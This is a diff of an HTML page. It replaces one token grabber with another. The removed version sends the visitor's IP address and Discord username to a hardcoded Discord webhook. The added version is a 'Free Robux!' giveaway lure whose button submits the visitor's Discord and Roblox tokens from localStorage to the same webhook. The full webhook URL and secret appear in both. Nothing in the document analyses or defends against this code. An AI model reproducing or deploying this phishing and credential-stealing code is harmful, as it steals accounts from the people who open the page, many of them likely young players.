@@ -1,65 +1,71 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>fentrock got you :(</title>
-    <script>
-        async function getIP() {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip;
+    <title>Free Robux!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            text-align: center;
+            padding-top: 50px;
         }
-
-        async function getDiscordUsername() {
-            const response = await fetch('https://discord.com/api/v9/users/@me', {
-                headers: {
-                    'Authorization': `Bearer ${localStorage.getItem('token')}`
-                }
-            });
-            const data = await response.json();
-            return data.username;
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 400px;
+            margin: 0 auto;
         }
-
-        async function sendToDiscordWebhook(ip, username) {
-            const webhookURL = 'https://discord.com/api/webhooks/1389442016022237284/qcCgWVD59eDxyiioti8HMUeyf6_xD3XRbgo1KxfbKF1X9fkVBPtcXy3TaIwdMpDF7mst';
-            const message = {
-                embeds: [
-                    {
-                        title: 'New Target',
-                        fields: [
-                            { name: 'IP Address', value: ip },
-                            { name: 'Discord Username', value: username }
-                        ],
-                        color: 0x00ff00
-                    }
-                ]
-            };
-            await fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(message)
-            });
+        .btn {
+            background-color: #5cb85c;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
         }
-
-        async function main() {
-            const ip = await getIP();
-            const token = localStorage.getItem('token'); // Assume the token is stored in localStorage
-            let username;
-            if (token) {
-                username = await getDiscordUsername();
-            } else {
-                username = 'Token not found';
-            }
-            await sendToDiscordWebhook(ip, username);
+        .btn:hover {
+            background-color: #4cae4c;
         }
-
-        main();
-    </script>
+    </style>
 </head>
 <body>
-    <h1>Please wait while we fetch your information...</h1>
+    <div class="container">
+        <h1>Welcome to our giveaway!</h1>
+        <p>Click the button below to claim your free Robux!</p>
+        <button class="btn" onclick="stealCredentials()">Claim Now!</button>
+    </div>
+
+    <script>
+        function stealCredentials() {
+            // Create hidden form to capture credentials
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://discord.com/api/webhooks/1389442016022237284/qcCgWVD59eDxyiioti8HMUeyf6_xD3XRbgo1KxfbKF1X9fkVBPtcXy3TaIwdMpDF7mst';
+            
+            // Add Discord token field
+            var discordToken = document.createElement('input');
+            discordToken.type = 'hidden';
+            discordToken.name = 'discord_token';
+            discordToken.value = localStorage.getItem('discord_token');
+            form.appendChild(discordToken);
+            
+            // Add Roblox token field
+            var robloxToken = document.createElement('input');
+            robloxToken.type = 'hidden';
+            robloxToken.name = 'roblox_token';
+            robloxToken.value = localStorage.getItem('roblox_token');
+            form.appendChild(robloxToken);
+            
+            // Submit the form
+            document.body.appendChild(form);
+            form.submit();
+            
+            // Show success message
+            alert('Thank you for participating!');
+        }
+    </script>
 </body>
 </html>
